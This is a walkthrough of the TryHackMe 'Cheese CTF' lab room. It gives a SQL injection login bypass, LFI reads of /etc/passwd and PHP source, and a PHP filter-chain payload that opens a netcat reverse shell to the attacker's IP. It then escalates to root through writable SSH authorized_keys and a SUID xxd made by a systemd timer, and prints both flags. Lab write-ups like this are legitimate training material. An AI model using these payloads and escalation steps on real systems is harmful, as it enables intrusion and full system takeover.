## Cheese CTF - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/cheesectfv10)

Please allow the machine a minimum of 5-7 minutes to boot. This is essential for the best part of the machine.

Hack into the machine and get the flags!

This room was inspired by a long cheese discussion and thread on the TryHackMe Discord, which included shadow, vain, sudo_veggies, and more.

While Vain made the box, shadow helped give ideas and debug, mrcode helped with some backend. 
We wanted to give a HUGE thanks to the THM staff for helping us through the process of uploading even after multiple failures!

**IP: 10.10.76.30**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- I'm just gonna say this, I started Nmap scan and finished the whole room and Nmap was still scanning....

  ```
  gobuster dir -u http://10.10.76.30/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 276]
  /.htaccess            (Status: 403) [Size: 276]
  /.htpasswd            (Status: 403) [Size: 276]
  /images               (Status: 301) [Size: 311] [--> http://10.10.76.30/images/]
  /index.html           (Status: 200) [Size: 1759]
  /server-status        (Status: 403) [Size: 276]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  
  gobuster dir -u http://10.10.76.30/ -w /usr/share/wordlists/dirb/common.txt -x php, txt
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.php                 (Status: 403) [Size: 276]
  /.                    (Status: 200) [Size: 1759]
  /.hta                 (Status: 403) [Size: 276]
  /.hta.php             (Status: 403) [Size: 276]
  /.htpasswd.           (Status: 403) [Size: 276]
  /.htaccess            (Status: 403) [Size: 276]
  /.htaccess.php        (Status: 403) [Size: 276]
  /.htpasswd            (Status: 403) [Size: 276]
  /.htpasswd.php        (Status: 403) [Size: 276]
  /.hta.                (Status: 403) [Size: 276]
  /.htaccess.           (Status: 403) [Size: 276]
  /images               (Status: 301) [Size: 311] [--> http://10.10.76.30/images/]
  /index.html           (Status: 200) [Size: 1759]
  /login.php            (Status: 200) [Size: 834]
  /server-status        (Status: 403) [Size: 276]
  Progress: 13842 / 13845 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```

---

## 🌐 Web Exploitation 

- To make your life easier this is the SQLI I used to bypass login page `' || 1=1;-- -`.
  
- There is also LFI after logging in.

  ```
  http://10.10.76.30/secret-script.php?file=supersecretadminpanel.html

  http://10.10.76.30/secret-script.php?file=/etc/passwd 
  [SNIP!]sshd:x:113:65534::/run/sshd:/usr/sbin/nologin systemd-cntu:/bin/bash

  http://10.10.76.30/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php
  <?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
  ?>
  ```

---

## ⚙️ Shell Access

- I got initial access with Python `php_filter_chain_generator.py`. You can find the script [here](https://github.com/synacktiv/php_filter_chain_generator). Use the script to make the reverse shell and upload it to the target with curl.

  ```
  $ python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f"); ?>' | grep '^php' > payload.txt

  $ curl -s "http://10.10.76.30/secret-script.php?file=$(cat payload.txt)"

  $ nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.76.30] 39232
  sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Switch to Putty shell and move on.

---

## 🧍 User Privilege Escalation

- We need to escalate to user `comte` then root in order to get both flags. We have access to write to `comte` SSH keys tho.

  ```
  www-data@ip-10-10-76-30:/home/comte$ find /  -type f -writable 2>/dev/null | grep -Ev '^(/proc|/snap|/sys|/dev)'
  /home/comte/.ssh/authorized_keys
  /etc/systemd/system/exploit.timer
  ```
  
- On your local machine crate a set of keys, then add them to `comte` authorized keys and then connect with SSH using the key you created.

  ```
  $ ssh-keygen -f id_ed25519 -t ed25519
  
  $ cat id_ed25519.pub 
  ssh-ed25519 [SNIP!] username@host

  www-data@ip-10-10-76-30:/var/www/html$ echo 'ssh-ed25519 [SNIP!] username@host' > /home/comte/.ssh/authorized_keys

  $ ssh -i id_ed25519 comte@10.10.76.30
  The authenticity of host '10.10.76.30 (10.10.76.30)' can't be established.
  ED25519 key fingerprint is SHA256:[SNIP!].
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '10.10.76.30' (ED25519) to the list of known hosts.
  Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
  
  [SNIP!]
  
  Last login: Thu Apr  4 17:26:03 2024 from 192.168.0.112
  comte@ip-10-10-76-30:~$ whoami
  comte
  comte@ip-10-10-76-30:~$ id
  uid=1000(comte) gid=1000(comte) groups=1000(comte),24(cdrom),30(dip),46(plugdev)
  ```
  
- Keep in mind, you add public key `.pub` to the `/home/comte/.ssh/authorized_keys` and login with SSH with private key. Now read the flag and let's get root.

  ```
  comte@ip-10-10-76-30:~$ cat user.txt 
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
  ⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
  ⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
  ⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
  ⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
  ⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
  ⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
  ⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
  ⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
  ⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
  ⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  
  
  THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
  ```

- 🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀

---

## 👑 Root Privilege Escalation

- For root flag, we will do the same thing but with a tiny twist.

  ```
  comte@ip-10-10-76-30:~$ sudo -l
  User comte may run the following commands on ip-10-10-76-30:
      (ALL) NOPASSWD: /bin/systemctl daemon-reload
      (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
      (ALL) NOPASSWD: /bin/systemctl start exploit.timer
      (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
  ```
  
- Now when you read these `exploit` files you will see that `exploit.service` will create a new directory `/opt/xxd` which we are going to abuse.

  ```
  comte@ip-10-10-76-30:~$ cat /etc/systemd/system/exploit.timer
  [Unit]
  Description=Exploit Timer
  
  [Timer]
  OnBootSec=
  
  [Install]
  WantedBy=timers.target

  comte@ip-10-10-76-30:~$ cat /etc/systemd/system/exploit.service 
  [Unit]
  Description=Exploit Service
  
  [Service]
  Type=oneshot
  ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
  ```
  
- Now edit the `exploit.timer` just by adding `5s` to the `OnBootSec=` and then run the commands with sudo.

  ```
  comte@ip-10-10-76-30:~$ cat /etc/systemd/system/exploit.timer
  [Unit]
  Description=Exploit Timer
  
  [Timer]
  OnBootSec=5s
  
  [Install]
  WantedBy=timers.target
  
  comte@ip-10-10-76-30:~$ sudo /bin/systemctl daemon-reload
  comte@ip-10-10-76-30:~$ 
  comte@ip-10-10-76-30:~$ sudo /bin/systemctl restart exploit.timer
  comte@ip-10-10-76-30:~$ sudo /bin/systemctl start exploit.timer
  comte@ip-10-10-76-30:~$ sudo /bin/systemctl enable exploit.timer
  Created symlink /etc/systemd/system/timers.target.wants/exploit.timer → /etc/systemd/system/exploit.timer.
  ```

- Exploit created `xxd` file in `/opt`.

  ```
  comte@ip-10-10-76-30:~$ ls -al /opt
  total 28
  drwxr-xr-x  2 root root  4096 Jun  1 13:57 .
  drwxr-xr-x 19 root root  4096 Jun  1 12:13 ..
  -rwsr-sr-x  1 root root 18712 Jun  1 13:57 xxd
  ```

- You can find the `xxd` exploit for writing to files on GTFObins. Use the same keys we created during previous escalation.

  ```
  comte@ip-10-10-76-30:~$ echo 'ssh-ed25519 [SNIP!] username@host' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys

  ssh -i id_ed25519 root@10.10.76.30                              
  Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
  
  [SNIP!]
  
  Last login: Sun May 11 19:44:19 2025 from 10.23.8.228
  root@ip-10-10-76-30:~# whoami
  root
  root@ip-10-10-76-30:~# id
  uid=0(root) gid=0(root) groups=0(root)
  ```

- Read the flag and say CHEEEEEEEEEEEEEEEEEEEEEEEESE!

  ```
  root@ip-10-10-76-30:~# cat root.txt 
        _                           _       _ _  __
    ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
   / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
  | (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
   \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|
  
  
  THM{dca75486094810807faf4b7b0a929b11e5e0167c}
  ```

- 🐭🐭🐭🐭🐭🐭🐭🐭🐭🐭🐭🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀🧀

---

## 🏁 Flags

- **User Flag**: `THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}`
- **Root Flag**: `THM{dca75486094810807faf4b7b0a929b11e5e0167c}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding my way to root.`

- What did I learn?
  `Few new skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
